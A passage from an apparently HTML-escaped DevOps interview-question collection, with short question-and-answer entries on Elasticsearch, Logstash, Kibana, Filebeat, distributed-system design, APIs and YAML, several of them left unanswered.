collection of documents and each document is a collection of fields, which are the key-value pairs that contain your data&#34; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Shards&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;An index is split into shards and documents are hashed to a particular shard. Each shard may be on a different node in a cluster and each one of the shards is a self contained index.&lt;br&gt; This allows Elasticsearch to scale to an entire cluster of servers. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is an Inverted Index?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;From the official docs:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&#34;An inverted index lists every unique word that appears in any document and identifies all of the documents each word occurs in.&#34; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a Document?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Continuing with the comparison to SQL/NoSQL a Document in Elastic is a row in table in the case of SQL or a document in a collection in the case of NoSQL. As in NoSQL a Document is a JSON object which holds data on a unit in your app. What is this unit depends on the your app. If your app related to book then each document describes a book. If you are app is about shirts then each document is a shirt. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;You check the health of your elasticsearch cluster and it&#39;s red. What does it mean? What can cause the status to be yellow instead of green?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Red means some data is unavailable. Yellow can be caused by running single node cluster instead of multi-node. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;True or False? Elasticsearch indexes all data in every field and each indexed field has the same data structure for unified and quick query ability&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;False. From the official docs:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&#34;Each indexed field has a dedicated, optimized data structure. For example, text fields are stored in inverted indices, and numeric and geo fields are stored in BKD trees.&#34; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What reserved fields a document has?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;_index&lt;/li&gt; &lt;li&gt;_id&lt;/li&gt; &lt;li&gt;_type &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Mapping&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are the advantages of defining your own mapping? (or: when would you use your own mapping?)&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;You can optimize fields for partial matching&lt;/li&gt; &lt;li&gt;You can define custom formats of known fields (e.g. date)&lt;/li&gt; &lt;li&gt;You can perform language-specific analysis &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Replicas&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;In a network/cloud environment where failures can be expected any time, it is very useful and highly recommended to have a failover mechanism in case a shard/node somehow goes offline or disappears for whatever reason. To this end, Elasticsearch allows you to make one or more copies of your index’s shards into what are called replica shards, or replicas for short. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can you explain Term Frequency &amp;amp; Document Frequency?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Term Frequency is how often a term appears in a given document and Document Frequency is how often a term appears in all documents. They both are used for determining the relevance of a term by calculating Term Frequency / Document Frequency. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;You check &#34;Current Phase&#34; under &#34;Index lifecycle management&#34; and you see it&#39;s set to &#34;hot&#34;. What does it mean?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&#34;The index is actively being written to&#34;. More about the phases &lt;a href=&#34;https://www.elastic.co/guide/en/elasticsearch/reference/7.6/ilm-policy-definition.html&#34;&gt;here&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What this command does? &lt;code&gt;curl -X PUT &#34;localhost:9200/customer/_doc/1?pretty&#34; -H &#39;Content-Type: application/json&#39; -d&#39;{ &#34;name&#34;: &#34;John Doe&#34; }&#39;&lt;/code&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;It creates customer index if it doesn&#39;t exists and adds a new document with the field name which is set to &#34;John Dow&#34;. Also, if it&#39;s the first document it will get the ID 1. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What will happen if you run the previous command twice? What about running it 100 times?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ol&gt;&#xA;  &lt;b&gt; &lt;li&gt;If name value was different then it would update &#34;name&#34; to the new value&lt;/li&gt; &lt;li&gt;In any case, it bumps version field by one &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ol&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the Bulk API? What would you use it for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Bulk API is used when you need to index multiple documents. For high number of documents it would be significantly faster to use rather than individual requests since there are less network roundtrips. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h5&gt;Query DSL&lt;/h5&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Elasticsearch query syntax (Booleans, Fields, Ranges)&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what is Relevance Score&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Query Context and Filter Context&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;From the official docs:&lt;/p&gt; &lt;p&gt;&#34;In the query context, a query clause answers the question “How well does this document match this query clause?” Besides deciding whether or not the document matches, the query clause also calculates a relevance score in the _score meta-field.&#34;&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&#34;In a filter context, a query clause answers the question “Does this document match this query clause?” The answer is a simple Yes or No — no scores are calculated. Filter context is mostly used for filtering structured data&#34; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Describe how would an architecture of production environment with large amounts of data would be different from a small-scale environment&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;There are several possible answers for this question. One of them is as follows:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;A small-scale architecture of elastic will consist of the elastic stack as it is. This means we will have beats, logstash, elastcsearch and kibana.&lt;br&gt; A production environment with large amounts of data can include some kind of buffering component (e.g. Reddis or RabbitMQ) and also security component such as Nginx. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h5&gt;Logstash&lt;/h5&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are Logstash plugins? What plugins types are there?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Input Plugins - how to collect data from different sources&lt;/li&gt; &lt;li&gt;Filter Plugins - processing data&lt;/li&gt; &lt;li&gt;Output Plugins - push data to different outputs/services/platforms &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is grok?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;A logstash plugin which modifies information in one format and immerse it in another. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How grok works?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What grok patterns are you familiar with?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is `_grokparsefailure?`&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How do you test or debug grok patterns?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are Logstash Codecs? What codecs are there?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h5&gt;Kibana&lt;/h5&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What can you find under &#34;Discover&#34; in Kibana?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;The raw data as it is stored in the index. You can search and filter it. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;You see in Kibana, after clicking on Discover, &#34;561 hits&#34;. What does it mean?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Total number of documents matching the search results. If not query used then simply the total number of documents. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What can you find under &#34;Visualize&#34;?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&#34;Visualize&#34; is where you can create visual representations for your data (pie charts, graphs, ...) &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What visualization types are supported/included in Kibana?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What visualization type would you use for statistical outliers&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Describe in detail how do you create a dashboard in Kibana&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Filebeat&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Filebeat?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;If one is using ELK, is it a must to also use filebeat? In what scenarios it&#39;s useful to use filebeat?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a harvester?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Read &lt;a href=&#34;https://www.elastic.co/guide/en/beats/filebeat/current/how-filebeat-works.html#harvester&#34;&gt;here&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;True or False? a single harvester harvest multiple files, according to the limits set in filebeat.yml&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;False. One harvester harvests one file. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are filebeat modules?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Elastic Stack&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How do you secure an Elastic Stack?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;You can generate certificates with the provided elastic utils and change configuration to enable security using certificates model. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Distributed&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Distributed Computing (or Distributed System)&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;According to Martin Kleppmann:&lt;/p&gt; &lt;p&gt;&#34;Many processes running on many machines...only message-passing via an unreliable network with variable delays, and the system may suffer from partial failures, unreliable clocks, and process pauses.&#34;&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Another definition: &#34;Systems that are physically separated, but logically connected&#34; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What can cause a system to fail?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Network&lt;/li&gt; &lt;li&gt;CPU&lt;/li&gt; &lt;li&gt;Memory&lt;/li&gt; &lt;li&gt;Disk &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Do you know what is &#34;CAP theorem&#34;? (aka as Brewer&#39;s theorem)&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;According to the CAP theorem, it&#39;s not possible for a distributed data store to provide more than two of the following at the same time:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Availability: Every request receives a response (it doesn&#39;t has to be the most recent data)&lt;/li&gt; &lt;li&gt;Consistency: Every request receives a response with the latest/most recent data&lt;/li&gt; &lt;li&gt;Partition tolerance: Even if some the data is lost/dropped, the system keeps running &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are the problems with the following design? How to improve it?&lt;br&gt; &lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/distributed/distributed_design_standby.png&#34; width=&#34;500x;&#34; height=&#34;350px;&#34;&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; 1. The transition can take time. In other words, noticeable downtime. 2. Standby server is a waste of resources - if first application server is running then the standby does nothing &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are the problems with the following design? How to improve it?&lt;br&gt; &lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/distributed/distributed_design_lb.png&#34; width=&#34;700x;&#34; height=&#34;350px;&#34;&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; Issues: If load balancer dies , we lose the ability to communicate with the application. &lt;p&gt;Ways to improve:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Add another load balancer&lt;/li&gt; &lt;li&gt;Use DNS A record for both load balancers&lt;/li&gt; &lt;li&gt;Use message queue &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is &#34;Shared-Nothing&#34; architecture?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;It&#39;s an architecture in which data is and retrieved from a single, non-shared, source usually exclusively connected to one node as opposed to architectures where the request can get to one of many nodes and the data will be retrieved from one shared location (storage, memory, ...). &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain the Sidecar Pattern (Or sidecar proxy)&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h2&gt;Misc&lt;/h2&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Name&lt;/th&gt; &#xA;   &lt;th&gt;Topic&lt;/th&gt; &#xA;   &lt;th&gt;Objective &amp;amp; Instructions&lt;/th&gt; &#xA;   &lt;th&gt;Solution&lt;/th&gt; &#xA;   &lt;th&gt;Comments&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Highly Available &#34;Hello World&#34;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/exercises/devops/ha_hello_world.md&#34;&gt;Exercise&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/exercises/devops/solutions/ha_hello_world.md&#34;&gt;Solution&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What happens when you type in a URL in an address bar in a browser?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &#xA;  &lt;ol&gt; &#xA;   &lt;li&gt;The browser searches for the record of the domain name IP address in the DNS in the following order:&lt;/li&gt; &#xA;  &lt;/ol&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Browser cache&lt;/li&gt; &#xA;   &lt;li&gt;Operating system cache&lt;/li&gt; &#xA;   &lt;li&gt;The DNS server configured on the user&#39;s system (can be ISP DNS, public DNS, ...)&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;ol start=&#34;2&#34;&gt; &#xA;   &lt;li&gt;If it couldn&#39;t find a DNS record locally, a full DNS resolution is started.&lt;/li&gt; &#xA;   &lt;li&gt;It connects to the server using the TCP protocol&lt;/li&gt; &#xA;   &lt;li&gt;The browser sends an HTTP request to the server&lt;/li&gt; &#xA;   &lt;li&gt;The server sends an HTTP response back to the browser&lt;/li&gt; &#xA;   &lt;li&gt;The browser renders the response (e.g. HTML)&lt;/li&gt; &#xA;   &lt;li&gt;The browser then sends subsequent requests as needed to the server to get the embedded links, javascript, images in the HTML and then steps 3 to 5 are repeated.&lt;/li&gt; &#xA;  &lt;/ol&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;TODO: add more details! &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;API&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what is an API&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;I like this definition from &lt;a href=&#34;https://blog.christianposta.com/microservices/api-gateways-are-going-through-an-identity-crisis&#34;&gt;blog.christianposta.com&lt;/a&gt;:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&#34;An explicitly and purposefully defined interface designed to be invoked over a network that enables software developers to get programmatic access to data and functionality within an organization in a controlled and comfortable way.&#34; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is an API specification?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;From &lt;a href=&#34;https://swagger.io/resources/articles/difference-between-api-documentation-specification&#34;&gt;swagger.io&lt;/a&gt;:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&#34;An API specification provides a broad understanding of how an API behaves and how the API links with other APIs. It explains how the API functions and the results to expect when using the API&#34; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;True or False? API Definition is the same as API Specification&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;False. From &lt;a href=&#34;https://swagger.io/resources/articles/difference-between-api-documentation-specification&#34;&gt;swagger.io&lt;/a&gt;:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&#34;An API definition is similar to an API specification in that it provides an understanding of how an API is organized and how the API functions. But the API definition is aimed at machine consumption instead of human consumption of APIs.&#34; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a Payload in API?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Automation? How it&#39;s related or different from Orchestration?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Automation is the act of automating tasks to reduce human intervention or interaction in regards to IT technology and systems.&lt;br&gt; While automation focuses on a task level, Orchestration is the process of automating processes and/or workflows which consists of multiple tasks that usually across multiple systems. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Tell me about interesting bugs you&#39;ve found and also fixed&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a Debuggger and how it works?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What services an application might have?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Authorization&lt;/li&gt; &lt;li&gt;Logging&lt;/li&gt; &lt;li&gt;Authentication&lt;/li&gt; &lt;li&gt;Ordering&lt;/li&gt; &lt;li&gt;Front-end&lt;/li&gt; &lt;li&gt;Back-end ... &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Metadata?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Data about data. Basically, it describes the type of information that an underlying data will hold. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;You can use one of the following formats: JSON, YAML, XML. Which one would you use? Why?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;I can&#39;t answer this for you :) &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What&#39;s KPI?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What&#39;s OKR?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What&#39;s DSL (Domain Specific Language)?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Domain Specific Language (DSLs) are used to create a customised language that represents the domain such that domain experts can easily interpret it. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What&#39;s the difference between KPI and OKR?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;YAML&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is YAML?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Data serialization language used by many technologies today like Kubernetes, Ansible, etc. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;True or False? Any valid JSON file is also a valid YAML file&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;True. Because YAML is superset of JSON. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the format of the following data? &lt;pre&gt;&lt;code&gt;{&#xA;    applications: [&#xA;        {&#xA;            name: &#34;my_app&#34;,&#xA;            language: &#34;python&#34;,&#xA;            version: 20.17&#xA;        }&#xA;    ]&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; JSON &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the format of the following data? &lt;pre&gt;&lt;code&gt;applications:&#xA;  - app: &#34;my_app&#34;&#xA;    language: &#34;python&#34;&#xA;    version: 20.17&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; YAML &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to write a multi-line string with YAML? What use cases is it good for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;someMultiLineString: |&#xA;  look mama&#xA;  I can write a multi-line string&#xA;  I love YAML&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; 